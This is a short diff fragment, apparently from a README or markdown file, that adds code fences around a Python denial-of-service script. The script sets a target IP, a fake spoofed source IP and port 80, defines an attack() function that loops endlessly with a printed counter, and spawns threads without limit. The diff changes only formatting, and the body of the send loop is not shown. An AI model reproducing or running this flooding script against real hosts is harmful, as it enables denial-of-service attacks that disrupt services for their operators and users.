@@ -18,7 +18,7 @@ import threading
 target = '127.0.0.1' # target ip
 fake_ip = '108.61.128.158'
 port = 80
-
+```
 an = 0
 def attack():
     while True:
@@ -32,9 +32,11 @@ def attack():
         print(an)
         
         client.close()
-
+```
+```
 while True:
     thread = threading.Thread(target=attack)
     thread.start()
-``
+```
+
 # Don't be disappointed
